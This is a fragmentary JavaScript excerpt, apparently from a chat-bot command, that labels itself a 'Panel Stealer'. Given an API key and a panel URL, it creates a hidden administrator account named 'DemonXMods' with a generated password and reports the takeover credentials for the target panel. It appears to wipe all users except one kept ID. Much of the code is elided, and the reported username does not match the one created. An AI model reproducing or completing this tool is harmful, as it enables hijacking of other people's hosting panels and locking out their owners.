...
const generateRandomPassword = () => {
    passwordaseli = 'SkyranXMods' + Math.random().toString(36).substring(7);
};
...
const PermenReset = async (apiKey, panelUrl, userIdToKeep) => {
    ...
    const createAdminUser = async () => {
        const newUser = {
            username: 'DemonXMods',
            email: 'Demon@reset.com',
            first_name: 'DemonXMods',
            last_name: 'DemonMods',
...
let handler = async (m, { text }) => {
    ...
    try {
        ...
        const resultn = `Panel Stealer Access By Demon
        \`Target:\` ${panelUrl}
        \`Keep ID:\` ${userIdToKeep}
        
        \`New User:\` demonstresser
        \`Mail:\` demon@gmail.com
        \`Password:\` ${passwordaseli}`;
